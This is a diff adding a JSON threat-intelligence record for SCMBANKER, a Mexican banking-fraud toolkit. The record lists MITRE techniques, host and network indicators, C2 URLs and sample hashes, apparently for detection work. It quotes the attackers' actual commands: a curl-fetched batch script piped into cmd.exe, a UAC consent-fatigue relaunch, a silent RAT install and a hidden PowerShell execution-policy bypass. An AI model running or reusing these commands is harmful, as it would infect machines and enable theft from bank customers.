@@ -1,0 +1,937 @@
+{
+  "malware_family": "SCMBANKER",
+  "threat_actor": "REF6045",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "SCMBANKER is an operator-assisted Mexican banking-fraud toolkit delivered through ClickFix fake-CAPTCHA pages that trick victims into piping a curl-fetched batch script (validation.txt) into cmd.exe from the Windows Run dialog. It sets up Run-key/Startup-folder persistence, beacons to PHP C2 panels, monitors banking window titles, captures screenshots, pushes vishing lock-screen overlays, hijacks CLABE and card-number clipboard data, and silently installs Remote Utilities for hands-on-keyboard access. All tooling is PowerShell/VBScript hosted on open directories with exposed C2 configuration editors.",
+  "mitre_techniques": [
+    "T1566.002",
+    "T1204.001",
+    "T1059.003",
+    "T1059.001",
+    "T1105",
+    "T1197",
+    "T1547.001",
+    "T1036.005",
+    "T1564.001",
+    "T1112",
+    "T1082",
+    "T1016",
+    "T1010",
+    "T1056.001",
+    "T1113",
+    "T1115",
+    "T1219",
+    "T1071.001",
+    "T1102",
+    "T1041",
+    "T1529",
+    "T1657"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "cmd /c curl -k http://68.211.161.46/validation.txt | cmd.exe & exit #                                                     CIoudfIare            Google Verificación Segura (Version 2025.5755)",
+      "context": "ClickFix command copied to clipboard, run from Windows Run dialog",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "start msedge.exe --kiosk https://fakeupdate.net/win10ue --edge-kiosk-type=fullscreen",
+      "context": "Batch script opens fake Windows Update kiosk as distraction",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "net session >nul 2>&1",
+      "context": "Elevation check in UAC consent-fatigue loop",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "powershell -Command \"Start-Process '%~f0' -Verb RunAs\"",
+      "context": "Self-relaunch every 20 seconds until admin granted",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "shutdown /r /t 02",
+      "context": "Forced reboot to trigger Run-key persistence",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "msiexec /i \"hosts.msi\" /quiet /norestart",
+      "context": "instaler.ps1 silent Remote Utilities install, parent instaler.ps1",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "attrib +h +s \"C:\\Users\\Public\"",
+      "context": "Hides implant directory after RAT install",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `\"$TempFilePath`\"",
+      "context": "Rotator runs cloned mutant script from %TEMP%",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "bitsadmin",
+      "context": "Downloads all scripts, files and binaries to C:\\Users\\Public\\",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Users\\Public\\",
+      "context": "Toolkit staging directory, hidden with attrib",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Users\\Public\\run.vbs",
+      "context": "Master launcher started on logon by Run key",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "run.vbs",
+      "context": "Also dropped to startup folder variants %APPDATA%, %USERPROFILE%\\AppData\\Roaming, %USERPROFILE%\\Start Menu",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Users\\Public\\id.txt",
+      "context": "Infection timestamp marker written once then self-deleted",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Users\\Public\\invi.cur",
+      "context": "Invisible cursor resource used by cursor2.exe",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Users\\Public\\key.ps1",
+      "context": "Keylogger script rotated by rotor.ps1",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Users\\Public\\screen2.ps1",
+      "context": "Screenshot module rotated by rotor1.ps1",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Users\\Public\\comando.txt",
+      "context": "Operator command file polled by avs.ps1, edifhjwe.ps1, correr.ps1",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Users\\Public\\99.kut",
+      "context": "Remote Utilities one-shot install guard file",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%TEMP%\\Agent_temp.zip",
+      "context": "Self-update ZIP downloaded from C2",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "client_id.txt",
+      "context": "Persistent GUID implant identifier",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "comentario.txt",
+      "context": "Operator notes/label for the victim, preserved across updates",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "agent.txt",
+      "context": "Remote-access install status, default SIN REMOTO AUN",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "hosts.msi",
+      "context": "Remote Utilities installer downloaded by avs.ps1",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "zkt.zip",
+      "context": "Exposed operation web-root archive on file server",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "validation.txt",
+      "context": "First-stage batch payload fetched by ClickFix command",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "config2.txt",
+      "context": "Local copy of banking window-title keyword list refreshed every 5 min",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "config_negative.txt",
+      "context": "Negative keyword filter refreshed every 5 min",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKCU\\...\\Run",
+      "context": "Run key value 'run' launches hidden PowerShell running run.vbs",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_value",
+      "value": "run",
+      "context": "HKCU\\...\\Run value name for hidden PowerShell launcher",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_value",
+      "value": "id",
+      "context": "RunOnce value writing %date% %time% to id.txt once",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKLM\\SOFTWARE\\Usoris\\Remote Utilities Host\\Host\\Parameters",
+      "context": "Registry blob configures RAT callback auto-connect, port 5650",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{F6688BD5-2126-4F4F-A484-1D05781479B9}",
+      "context": "UninstallString deleted to prevent RAT removal",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "CIoudfIare",
+      "context": "Decoy brand text with capital-I homoglyphs in ClickFix command",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Google Verificación Segura (Version 2025.5755)",
+      "context": "Lure text appended to ClickFix Run-dialog command",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Windows: Se requieren permisos de administrador para actualizar su sistema...",
+      "context": "Spanish UAC consent-fatigue prompt in batch script",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "SIN REMOTO AUN",
+      "context": "Default value of remoto/agent.txt field in C2 beacon",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "REMOTO INSTALADO",
+      "context": "Written to agent.txt after Remote Utilities install",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "BOT ACTUALIZADO",
+      "context": "Completion flag written to comando.txt after self-update",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "update",
+      "context": "Hardcoded optUpdate beacon field, always overrides real status",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "46053.045416157",
+      "context": "Hardcoded Remote Utilities registry callback SID",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "dXNlcjMyLmRsbA==",
+      "context": "key.ps1 Base64-encoded Win32 API name (user32.dll)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "R2V0QXN5bmNLZXlTdGF0ZQ==",
+      "context": "key.ps1 Base64-encoded GetAsyncKeyState",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "R2V0S2V5Ym9hcmRMYXlvdXQ=",
+      "context": "key.ps1 Base64-encoded GetKeyboardLayout",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "VG9Vbmljb2RlRXg=",
+      "context": "key.ps1 Base64-encoded ToUnicodeEx",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "INTERVALOS DE TIEMPO",
+      "context": "Banner-comment divider opening every SCMBANKER script",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "LOOP PRINCIPAL",
+      "context": "Banner-comment divider in SCMBANKER scripts",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Detected C0incidence: '<keyword>' Version: V.1.0.1",
+      "context": "Banking-session alert POST body (avisos2.php), mensaje field",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Captura enviada y script finalizado.",
+      "context": "screen2.ps1 log line after screenshot upload",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "DrioverrHost.exe",
+      "context": "Masquerade process name used by rotator mutants",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "WmirPrvSE.exe",
+      "context": "Masquerade process name used by rotator mutants",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "UpdaterTask.exe",
+      "context": "Masquerade process name used by rotator mutants",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "ip",
+      "value": "68.211.161.46",
+      "context": "ClickFix / file host and web root",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "216.250.112.100",
+      "context": "ClickFix / file host (osogransd variant)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "185.242.246.169",
+      "context": "REF6045 C2 (osogransd variant)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "negratomasa2026.online",
+      "context": "REF6045 C2 panel host",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "gestionmontelavaria2026.online",
+      "context": "REF6045 C2 panel host (monteviral variant)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "ratonvaquero2026.online",
+      "context": "ClickFix lure and toolkit file host",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "monteviral2026.duckdns.org",
+      "context": "ClickFix lure and toolkit file host",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "osogransd.online",
+      "context": "ClickFix lure and toolkit file host",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "ssinvestigaciones.com",
+      "context": "ClickFix post-CAPTCHA tracking endpoint",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "bancaporinternetbbmx.online",
+      "context": "Phishing redirect destination with Telegram notify script",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "fakeupdate.net",
+      "context": "Fake Windows Update decoy page opened in Edge kiosk mode",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "api.ipify.org",
+      "context": "Public IP lookup used in C2 beacon profile",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://68.211.161.46/",
+      "context": "ClickFix web root hosting fake-CAPTCHA page",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://68.211.161.46/files/",
+      "context": "Open directory staging SCMBANKER toolkit scripts and zkt.zip",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://68.211.161.46/validation.txt",
+      "context": "First-stage batch payload download piped to cmd.exe",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://68.211.161.46/driver.html?off",
+      "context": "Vishing page linking to Remote Utilities payload",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://216.250.112.100/validation.txt",
+      "context": "First-stage batch payload download (osogransd variant)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://185.242.246.169/b/editor.php",
+      "context": "C2 exposed unauthenticated config editor",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://185.242.246.169/dashboard2/recData.php",
+      "context": "C2 beacon POST endpoint (osogransd variant)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://ratonvaquero2026.online/",
+      "context": "ClickFix lure host",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://monteviral2026.duckdns.org/files/",
+      "context": "Toolkit file host under open directory",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://osogransd.online/",
+      "context": "ClickFix lure host",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://negratomasa2026.online/dashboard2/recData.php",
+      "context": "C2 beacon POST endpoint with machine profile",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://negratomasa2026.online/dashboard2/avisos2.php",
+      "context": "Banking-session alert endpoint",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://negratomasa2026.online/dashboard2/imagenes.php",
+      "context": "Screenshot upload endpoint",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://negratomasa2026.online/dashboard2/logs.php",
+      "context": "Keylogger exfiltration endpoint",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://negratomasa2026.online/a/teleavisos.txt",
+      "context": "Remote config executing arbitrary PowerShell via Invoke-Expression",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://negratomasa2026.online/b/listadebancos.txt",
+      "context": "Banking window-title keyword list (bank names plus redirect target)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://negratomasa2026.online/b/keysnegativas.txt",
+      "context": "Negative keyword filter for false-positive window matching",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://negratomasa2026.online/a/telekeylogger.txt",
+      "context": "Telegram keylogger credentials config (fetched, unused)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://negratomasa2026.online/b/urlsscams.txt",
+      "context": "Phishing redirect target list used by jujuzkt2.ps1",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://negratomasa2026.online/b/clabes.txt",
+      "context": "Attacker CLABE replacement values for clipboard hijack",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://negratomasa2026.online/b/tarjetas.txt",
+      "context": "Attacker card-number replacement values for clipboard hijack",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://negratomasa2026.online/b/editor.php",
+      "context": "C2 exposed config editor",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://gestionmontelavaria2026.online/dashboard2/recData.php",
+      "context": "C2 beacon POST endpoint (monteviral variant)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://gestionmontelavaria2026.online/b/editor.php",
+      "context": "C2 exposed config editor",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://ww.ssinvestigaciones.com/login3.php",
+      "context": "ClickFix post-CAPTCHA tracking endpoint",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://bancaporinternetbbmx.online",
+      "context": "Phishing redirect destination",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "b30cb0aa977aacdab94d2ef503186c8f0b2fc10d7cf0d7c7c0ada70c127dc7e8",
+      "description": "zkt.zip exposed web-root archive of the operation"
+    },
+    {
+      "sha256": "554f1aefeb698995501751328c2f9fe93f02a680679fba3dd15f1ed93d46bf1b",
+      "description": "validation.txt first-stage batch payload"
+    },
+    {
+      "sha256": "ff3555154e91e42490cc722b6c7f3c4c91654b7ef53a35d0719ffb89accf1b27",
+      "description": "run.vbs master launcher"
+    },
+    {
+      "sha256": "526287a40aad1b218228cdd1f459ad3b93f858585048347644d597c6ab19515a",
+      "description": "cliente.ps1 C2 beacon"
+    },
+    {
+      "sha256": "685d29ce8a550feb3a9e1d1c5926ec5e927615cf34aab62c108a812a1eb6737c",
+      "description": "jujuzkt.ps1 banking activity monitor"
+    },
+    {
+      "sha256": "8c87ea94401fa97d3743a87604e088d1a29c7b06cf9673623941a42da68452a6",
+      "description": "jujuzkt2.ps1 active browser redirect module"
+    },
+    {
+      "sha256": "6dcd7fdd5e088d98d861cbd1cb74a7b83ae5508f4dbb617413bcbe7fbc8a82e2",
+      "description": "mensaje1.ps1 vishing dispatcher"
+    },
+    {
+      "sha256": "4d9c160ebb44507b11f0e6421f691900284f25b5530a23d9fd50de0ae01663ca",
+      "description": "mensaje.ps1 hard-lock vishing overlay"
+    },
+    {
+      "sha256": "0315d4a7bc14654ad66d4c2b98920b92ca18cbc231b3ce5fba1fcac70b828e19",
+      "description": "mensajeoff.ps1 soft-lock vishing overlay"
+    },
+    {
+      "sha256": "5d17645548a44fe39d3cc816ffa3933321c1eb8b08a8f4348e3cd82f25112c81",
+      "description": "rotor1.ps1 screenshot module invoker"
+    },
+    {
+      "sha256": "566f4bfdfea54129b8528d50cae187a9030e2f2787749add4b0db22ac35ea581",
+      "description": "screen2.ps1 screenshot capture and upload module"
+    },
+    {
+      "sha256": "882d582e85d5bb7abbdde791a2d52e3b1bb7dd7f79c20318ce64b74249221fdb",
+      "description": "rotor2.ps1 vishing dispatcher rotator"
+    },
+    {
+      "sha256": "eea08fbf3720d638af1d313d3ce369708b77d7891379d5c5871dd7f36667ed0c",
+      "description": "clip.ps1 CLABE clipboard hijacker"
+    },
+    {
+      "sha256": "70140aa236d630a7d5ed08be3dafcccea9a8b0eec6dadf8c1cf1b96d8f608609",
+      "description": "clip2.ps1 card-number clipboard hijacker"
+    },
+    {
+      "sha256": "6c8ba7127a83431432e85946976c18bb3f3e9bf9def68aae572cd1d9d73604c7",
+      "description": "avs.ps1 Remote Utilities downloader"
+    },
+    {
+      "sha256": "81a4512db985359ed361755da58a1177b07632b5aee951c68a6ace54f4d0534b",
+      "description": "instaler.ps1 Remote Utilities installer launcher"
+    },
+    {
+      "sha256": "3d9015429d65276869ceb9c91f10d6474b1098042db75949c49b9f1682c1f3ae",
+      "description": "remoto.ps1 Remote Utilities configurator"
+    },
+    {
+      "sha256": "30ff24faad80184bb43660a8bd317df99a8d09d31bae3b446aaa876543f2620f",
+      "description": "key.ps1 Telegram-backed keylogger"
+    },
+    {
+      "sha256": "4b7b35b921d7615b7a82a42c379560d1b0c5a74c81311a269874195ba2744f2d",
+      "description": "cursor2.exe invisible-cursor utility (AutoIt)"
+    },
+    {
+      "sha256": "32d981b3e7c36aa7030cfd9ee412bff742e00b36c39c80634b2681f89de4a487",
+      "description": "hosts.msi Remote Utilities installer"
+    }
+  ],
+  "file_types": [
+    "script",
+    "pe",
+    "archive"
+  ]
+}
